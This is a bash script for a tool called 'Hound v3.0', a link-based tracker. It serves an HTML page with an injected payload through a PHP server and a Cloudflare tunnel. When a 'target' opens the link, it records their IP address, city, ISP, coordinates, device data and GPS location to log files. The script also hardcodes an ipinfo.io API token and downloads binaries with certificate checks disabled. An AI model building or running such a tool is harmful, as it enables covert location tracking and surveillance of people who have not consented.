#!/bin/bash
# Hound v3.0 - Enhanced Information Gathering Tool
# Powered by NRXQuantum

trap 'printf "\n"; stop' 2

banner() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
printf " \e[1;93m      Hound Ver 3.0 - Enhanced Edition (Python Viewer Ready)\e[0m \n"
printf " \e[1;92m      NRXQuantum \e[0m \n"
printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is required but not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "curl is required but not installed. Install it. Aborting."; exit 1; }
}

stop() {
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    killall -2 ssh > /dev/null 2>&1
    if [[ -n "$TAIL_PID" ]]; then
        kill $TAIL_PID 2>/dev/null
        wait $TAIL_PID 2>/dev/null
    fi
    pkill -f "tail -f data.txt" > /dev/null 2>&1
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
    printf "\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    
    location_data=$(curl -s "https://ipinfo.io/$ip?token=e1a66456c1074c")
    if [[ -n "$location_data" ]]; then
        city=$(echo "$location_data" | grep -o '"city": "[^"]*"' | cut -d '"' -f4)
        region=$(echo "$location_data" | grep -o '"region": "[^"]*"' | cut -d '"' -f4)
        country=$(echo "$location_data" | grep -o '"country": "[^"]*"' | cut -d '"' -f4)
        loc=$(echo "$location_data" | grep -o '"loc": "[^"]*"' | cut -d '"' -f4)
        org=$(echo "$location_data" | grep -o '"org": "[^"]*"' | cut -d '"' -f4)
        timezone=$(echo "$location_data" | grep -o '"timezone": "[^"]*"' | cut -d '"' -f4)
        
        printf "\e[1;92m[\e[0m+\e[1;92m] Location:\e[0m\n"
        printf "   \e[1;77mCity:\e[0m $city\n"
        printf "   \e[1;77mRegion:\e[0m $region\n"
        printf "   \e[1;77mCountry:\e[0m $country\n"
        printf "   \e[1;77mCoordinates:\e[0m $loc\n"
        printf "   \e[1;77mISP:\e[0m $org\n"
        printf "   \e[1;77mTimezone:\e[0m $timezone\n"
        
        {
            echo "========================================"
            echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
            echo "IP: $ip"
            echo "City: $city"
            echo "Region: $region"
            echo "Country: $country"
            echo "Coordinates: $loc"
            echo "ISP: $org"
            echo "Timezone: $timezone"
            echo "========================================"
        } >> location.log
    else
        printf "\e[1;31m[!] Could not fetch location data.\e[0m\n"
    fi
    
    cat ip.txt >> saved.ip.txt 2>/dev/null
    rm -rf ip.txt
}

TAIL_PID=""
checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            
            if [[ -n "$TAIL_PID" ]]; then
                kill $TAIL_PID 2>/dev/null
                wait $TAIL_PID 2>/dev/null
                TAIL_PID=""
            fi
            
            printf "\e[1;92m[\e[0m+\e[1;92m] Collecting device and GPS data...\n"
            printf "\e[1;33m------------------------------------------------------------\e[0m\n"
            
            tail -f -n 0 data.txt 2>/dev/null &
            TAIL_PID=$!
            
            sleep 1
        fi
        sleep 0.5
    done
}

cf_server() {
    if command -v cloudflared &> /dev/null; then
        echo "✅ Cloudflared is already installed."
    else
        printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared not found. Trying to install via APT...\n"
        if command -v sudo &> /dev/null; then
            sudo apt-get update -y > /dev/null 2>&1
            sudo apt-get install -y curl gnupg lsb-release > /dev/null 2>&1
            sudo mkdir -p --mode=0755 /usr/share/keyrings
            curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg | sudo tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null
            echo "deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared any main" | sudo tee /etc/apt/sources.list.d/cloudflared.list >/dev/null
            sudo apt-get update -y > /dev/null 2>&1
            sudo apt-get install -y cloudflared > /dev/null 2>&1
            if command -v cloudflared &> /dev/null; then
                printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared installed successfully via APT!\n"
            else
                printf "\e[1;31m[!] APT installation failed.\e[0m\n"
                exit 1
            fi
        else
            printf "\e[1;33m[!] sudo not found. Falling back to wget download...\e[0m\n"
            command -v wget > /dev/null 2>&1 || { echo >&2 "wget is required for fallback. Install it. Aborting."; exit 1; }
            arch=$(uname -m)
            arch2=$(uname -a | grep -o 'Android' | head -n1)
            if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
            elif [[ "$arch" == *'aarch64'* ]]; then
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
            elif [[ "$arch" == *'x86_64'* ]]; then
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
            else
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
            fi
            chmod +x cloudflared
            export PATH="$PWD:$PATH"
            printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared downloaded via wget.\n"
        fi
    fi

    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2

    printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\n"
    rm -f cf.log > /dev/null 2>&1

    if command -v cloudflared &> /dev/null; then
        cloudflared tunnel --url http://127.0.0.1:3333 --loglevel info --logfile cf.log > /dev/null 2>&1 &
    else
        ./cloudflared tunnel --url http://127.0.0.1:3333 --loglevel info --logfile cf.log > /dev/null 2>&1 &
    fi

    sleep 12

    if [[ ! -f cf.log ]]; then
        printf "\e[1;31m[!] Log file not created. Cloudflared may have failed to start.\e[0m\n"
        exit 1
    fi

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" | head -n1)

    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link is not generating. Trying again after 5 seconds...\e[0m\n"
        sleep 5
        link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" | head -n1)
    fi

    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Failed to get link. Check your internet connection.\e[0m\n"
        printf "\e[1;33m[!] Last 5 lines of cf.log for debugging:\e[0m\n"
        tail -n 5 cf.log
        exit 1
    else
        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    fi
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    checkfound
}

local_server() {
    sed 's+forwarding_link+''+g' template.php > index.php
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on Localhost:8080...\n"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
    sleep 2
    checkfound
}

hound() {
    if [[ -e data.txt ]]; then
        cat data.txt >> targetreport.txt
        rm -rf data.txt
        touch data.txt
    fi
    if [[ -e ip.txt ]]; then
        rm -rf ip.txt
    fi
    sed -e '/tc_payload/r payload.txt' index_chat.html > index.html

    default_option_server="Y"
    read -p $'\n\e[1;93m Do you want to use Cloudflared tunnel?\n \e[1;92mOtherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
        cf_server
    else
        local_server
    fi
}

banner
dependencies
hound